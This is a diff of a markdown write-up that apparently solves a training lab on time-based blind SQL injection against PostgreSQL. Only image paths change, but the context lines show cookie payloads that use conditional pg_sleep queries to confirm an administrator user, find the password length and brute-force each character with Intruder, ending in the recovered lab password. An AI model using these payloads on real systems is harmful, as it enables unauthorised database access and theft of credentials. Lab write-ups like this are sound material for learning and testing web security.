@@ -14,7 +14,7 @@ ___
 #blind_sql #time_delay #postgres_database
 
 **NOTE:**
-![screnshot](./images/lab15_0.png)
+![screnshot](images/lab15_0.jpg)
 
 `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
 
@@ -29,7 +29,7 @@ TrackingId=Bz1TiFgyU9JfEPNb'%3bSELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(10)+ELSE+p
 ```
 when you send request it will take around 10 second then you will get 200 response
 
-![screnshot](./images/lab15_1.png)
+![screnshot](images/lab15_1.jpg)
 
 step 2
 `';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--`
@@ -41,7 +41,7 @@ TrackingId=Bz1TiFgyU9JfEPNb'%3bSELECT+CASE+WHEN+(1%3d2)+THEN+pg_sleep(10)+ELSE+p
 ```
 when you send request it will take around 2 second then you will get 200 response
 
-![screnshot](./images/lab15_2.png)
+![screnshot](images/lab15_2.jpg)
 
 step 3
 `';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`
@@ -53,7 +53,7 @@ TrackingId=tax9NfTM7uDS6d4O'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+
 ```
 when you send request it will take around 10 second then you will get 200 response
 
-![screnshot](./images/lab15_3.png)
+![screnshot](images/lab15_3.jpg)
 
 step 4
 `';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`
@@ -65,7 +65,7 @@ TrackingId=tax9NfTM7uDS6d4O'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+
 ```
 when you send request it will take around 10 second then you will get 200 response
 
-![screnshot](./images/lab15_4.png)
+![screnshot](images/lab15_4.jpg)
 
 step 5
 
@@ -77,9 +77,9 @@ step 5
 TrackingId=tax9NfTM7uDS6d4O'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+LENGTH(password)>§1§)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 ```
 
-![screnshot](./images/lab15_5.png)
+![screnshot](images/lab15_5.jpg)
 
-![screnshot](./images/lab15_6.png)
+![screnshot](images/lab15_6.jpg)
 
 step 6
 
@@ -96,11 +96,11 @@ payload 1 => number => 1 to 20
 payload 2 => simple list => a-z and 0-9
 Resource pool => 1 millisecond
 
-![screnshot](./images/lab15_7.png)
+![screnshot](images/lab15_7.jpg)
 
 filter result with response time 
 
-![screnshot](./images/lab15_8.png)
+![screnshot](images/lab15_8.jpg)
 
 `nu0go0r579x1l1rppjnz`
 
@@ -108,4 +108,4 @@ step 7
 
 To solve the use username as `administrator` and password `nu0go0r579x1l1rppjnz`
 
-![screnshot](./images/lab15_9.png)
+![screnshot](images/lab15_9.jpg)
